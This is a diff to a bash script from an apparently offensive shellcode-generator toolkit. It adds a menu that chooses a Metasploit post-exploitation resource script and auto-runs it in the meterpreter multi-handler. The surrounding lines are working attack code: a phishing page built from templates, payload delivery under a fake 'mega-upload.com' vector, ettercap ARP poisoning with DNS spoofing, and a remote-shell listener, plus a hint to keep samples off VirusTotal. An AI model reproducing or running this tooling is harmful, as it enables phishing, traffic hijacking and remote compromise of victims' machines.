@@ -411,6 +411,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
 
    else
 
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "post_linux.rc" --width 350 --height 200) > /dev/null 2>&1
 
       # edit files nedded
       cd $IPATH/templates/phishing
@@ -429,22 +430,24 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         sed "s|NaM3|$N4m|" $IPATH/templates/phishing/index2.html > $D3F/index.html
         cp $IPATH/output/$N4m $D3F/$N4m
         echo "- ATTACK VECTOR: http://mega-upload.com"
+        echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
         echo "[☠ ] Start a multi-handler..."
         echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯ ] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
         echo "- ATTACK VECTOR: http://$lhost"
+        echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
         echo "[☠ ] Start a multi-handler..."
         echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯ ] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
 
         fi
    fi
